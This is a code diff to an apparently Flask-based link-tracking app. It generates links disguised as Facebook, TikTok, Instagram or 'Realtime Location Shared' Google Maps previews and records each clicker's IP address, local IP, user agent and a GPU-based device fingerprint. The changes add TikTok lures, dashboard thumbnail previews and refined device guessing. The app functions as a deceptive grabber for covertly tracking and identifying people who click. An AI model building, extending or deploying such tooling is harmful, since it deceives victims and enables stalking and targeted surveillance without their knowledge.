@@ -32,7 +32,6 @@ def init_db():
                 target_platform TEXT
             )
         ''')
-        # تم إضافة حقل device_model لتخزين الاسم الدقيق والمستنتج للهاتف
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS clicks (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -55,28 +54,25 @@ def init_db():
 
 init_db()
 
-# قاعدة بيانات مصغرة ومتقدمة داخل السيرفر للمطابقة والتحقق المتقاطع (Hardware Fingerprinting)
 def guess_device_by_hardware(ua_string, gpu, touch_points):
     gpu_upper = gpu.upper()
     ua_upper = ua_string.upper()
     
-    # التحقق أولاً إذا كان آيفون/آيباد (iOS) ويحاول الاختباء في المتصفح الافتراضي
     if "IPHONE" in ua_upper or "MACINTOSH" in ua_upper:
         if "APPLE" in gpu_upper or "METAL" in gpu_upper:
             if "5" in str(touch_points): return "Apple iPhone (Advanced iOS Client)"
             return "Apple Device (iPad/Mac)"
 
-    # التحقق من هواتف الأندرويد بناءً على المعالجات الرسومية الشهيرة
     if "MALI-G710" in gpu_upper:
-        return "Android Flagship (e.g., Redmi Note 12 Pro / Galaxy A54 فئة متوسطة عليا)"
+        return "Android Flagship (e.g., Redmi Note 12 Pro / Galaxy A54)"
     elif "MALI-G57" in gpu_upper:
-        return "Android Device (e.g., Realme C11 / Infinix / Tecno فئة اقتصادية)"
+        return "Android Device (e.g., Realme C11 / Infinix / Tecno)"
     elif "ADRENO (TM) 610" in gpu_upper or "ADRENO 610" in gpu_upper:
         return "Android Device (e.g., Xiaomi Redmi 9 / Oppo A53)"
     elif "ADRENO (TM) 730" in gpu_upper or "ADRENO 730" in gpu_upper:
         return "Android Premium Flagship (e.g., Samsung S22 Ultra / Xiaomi 12 Pro)"
     elif "POWERVR" in gpu_upper or "GE8320" in gpu_upper:
-        return "Android Device (e.g., Samsung A03s / Realme C21 الفئة الاقتصادية)"
+        return "Android Device (e.g., Samsung A03s / Realme C21)"
         
     if "ANDROID" in ua_upper:
         return "Generic Android Smartphone"
@@ -93,25 +89,35 @@ def fetch_original_meta(url, manual_thumb_url=None):
             title = "Instagram Post Media Player"
         elif "facebook.com" in url_lower or "fb.watch" in url_lower:
             title = "Facebook Video Player HD"
+        elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+            title = "TikTok Video Content Player"
         return title, manual_thumb_url.strip()
         
     if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
-    elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+        return title, img
+        
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    }
+
+    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
         try:
-            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", timeout=4)
+            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", headers=headers, timeout=5)
             if res.status_code == 200:
                 data = res.json()
                 return data.get('title', title), data.get('thumbnail_url', img)
-        except: pass
+        except: 
+            pass
     elif "youtube.com" in url_lower or "youtu.be" in url_lower:
         try:
             res = requests.get(f"https://noembed.com/embed?url={url}", timeout=4)
             if res.status_code == 200:
                 data = res.json()
                 return data.get('title', title), data.get('thumbnail_url', img)
-        except: pass
+        except: 
+            pass
             
     return title, img
 
@@ -182,7 +188,7 @@ DASHBOARD_LAYOUT = '''
                 <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
                 <div id="thumbnail_wrapper" class="conditional-thumbnail">
-                    <b style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected (Manual Mode Active):</b>
+                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected (Manual Mode Active):</b>
                     <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الزر أدناه ثم لصقه في الحقل:</p>
                     
                     <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
@@ -208,18 +214,27 @@ DASHBOARD_LAYOUT = '''
         function checkUrlDomain(val) {
             var thumbWrapper = document.getElementById('thumbnail_wrapper');
             var extractorLink = document.getElementById('extractor_link');
+            var warningTitle = document.getElementById('meta_warning_title');
             var low = val.toLowerCase();
             
             if (low.includes("instagram.com")) {
                 thumbWrapper.style.display = "block";
+                warningTitle.innerText = "⚠️ Instagram Link Detected (Manual Mode Active):";
                 extractorLink.href = "https://thumbnail-downloader.com/instagram";
                 extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Instagram";
                 document.getElementById('manual_thumbnail').required = true;
             } else if (low.includes("facebook.com") || low.includes("fb.watch")) {
                 thumbWrapper.style.display = "block";
+                warningTitle.innerText = "⚠️ Facebook Link Detected (Manual Mode Active):";
                 extractorLink.href = "https://thumbnail-downloader.com/Facebook";
                 extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Facebook";
                 document.getElementById('manual_thumbnail').required = true;
+            } else if (low.includes("tiktok.com") || low.includes("vt.tiktok")) {
+                thumbWrapper.style.display = "block";
+                warningTitle.innerText = "⚠️ TikTok Link Detected (Fallback Support Active):";
+                extractorLink.href = "https://urlebird.com/";
+                extractorLink.innerText = "🔗 استخراج غلاف الفيديو احتياطياً إن لزم الأمر";
+                document.getElementById('manual_thumbnail').required = false; // نتركه اختيارياً لرؤية النتيجة التلقائية أولاً
             } else {
                 thumbWrapper.style.display = "none";
                 document.getElementById('manual_thumbnail').required = false;
@@ -241,15 +256,16 @@ MY_LINKS_LAYOUT = '''
         body { font-family: 'Segoe UI', sans-serif; background-color: #f8fafc; margin: 0; padding: 0; }
         .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .navbar a { color: white; text-decoration: none; font-size: 14px; background: #3b82f6; padding: 8px 15px; border-radius: 6px; }
-        .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
+        .container { max-width: 1200px; margin: 30px auto; padding: 20px; }
         .table-wrapper { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
         .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
-        .main-table th, .main-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
+        .main-table th, .main-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; }
         .main-table th { background-color: #0f172a; color: white; }
         .badge { background: #ef4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
         .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; color: white; }
         .btn-view { background-color: #2563eb; }
         .btn-del { background-color: #dc2626; margin-left: 5px; }
+        .thumb-preview { width: 80px; height: 50px; border-radius: 4px; object-fit: cover; border: 1px solid #cbd5e1; background: #f1f5f9; display: block; }
     </style>
 </head>
 <body>
@@ -262,7 +278,7 @@ MY_LINKS_LAYOUT = '''
             <table class="main-table">
                 <thead>
                     <tr>
-                        <th>Description / Note</th>
+                        <th>Preview Image</th> <th>Description / Note</th>
                         <th>Target Platform</th>
                         <th>Fetched Title</th>
                         <th>Total Clicks</th>
@@ -273,6 +289,9 @@ MY_LINKS_LAYOUT = '''
                 <tbody>
                     {% for link in links_list %}
                     <tr>
+                        <td>
+                            <img src="{{ link.custom_image }}" class="thumb-preview" alt="No Thumbnail Found">
+                        </td>
                         <td style="font-weight: 600;">{{ link.note }}</td>
                         <td>{{ link.target_platform }}</td>
                         <td>{{ link.video_title }}</td>
@@ -372,7 +391,7 @@ def my_links():
         cursor = conn.cursor()
         cursor.execute('''
             SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.target_platform, COUNT(c.id) as clicks_count 
-            FROM links l LEFT JOIN clicks  c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
+            FROM links l LEFT JOIN clicks c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
         ''')
         links_list = cursor.fetchall()
     return render_template_string(MY_LINKS_LAYOUT, links_list=links_list)
@@ -542,18 +561,15 @@ def log_click(link_id):
     gpu_info = data.get('gpu', 'Unknown')
     touch_pts = data.get('touch_points', '0')
     
-    # تفكيك وفحص نوع الموديل بأقصى دقة ممكنة
     device_model_final = "Unknown Client Hardware"
     try:
         user_agent = parse(ua_string)
         brand = user_agent.device.brand
         model = user_agent.device.model
         
-        # 1. إذا كان المتصفح يرسل الاسم الصريح والمفتوح (مثل تطبيقات فيسبوك)
         if brand and model and brand.lower() != "generic" and model.lower() != "smartphone":
             device_model_final = f"{brand} {model}"
         else:
-            # 2. خط الدفاع الثاني: إذا كان المتصفح مقيداً (حرف K) نقوم بالمطابقة المادية الرسومية
             device_model_final = guess_device_by_hardware(ua_string, gpu_info, touch_pts)
             
     except Exception as e:
@@ -571,7 +587,7 @@ def log_click(link_id):
             ip_address, 
             data.get('local_ip', 'Encrypted (mDNS)'), 
             ua_string, 
-            device_model_final, # حفظ اسم الهاتف بدقة هنا
+            device_model_final,
             current_time,
             data.get('language', 'fr-FR'),
             data.get('screen_size', 'Unknown'),
